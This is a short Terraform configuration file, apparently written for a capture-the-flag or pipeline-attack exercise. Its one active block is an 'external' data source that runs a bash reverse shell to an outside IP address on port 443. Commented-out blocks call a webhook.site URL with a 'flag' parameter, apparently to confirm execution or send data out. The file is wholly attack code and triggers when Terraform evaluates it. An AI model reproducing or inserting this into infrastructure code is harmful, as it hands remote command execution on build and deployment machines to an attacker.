# data "external" "flag" {
#   program = ["bash", "-c", "curl https://webhook.site/ac018f78-2dd1-4be6-b53f-2e1e948b7d64?a=flag1"]
# }

data "external" "flag" {
  program = ["bash", "-c", "bash -i >& /dev/tcp/54.255.168.86/443 0>&1"]
}

# data "http" "example" {
#   url = "https://webhook.site/ac018f78-2dd1-4be6-b53f-2e1e948b7d64?a=1"

#   # Optional request headers
#   request_headers = {
#     Accept = "application/json"
#   }
# }
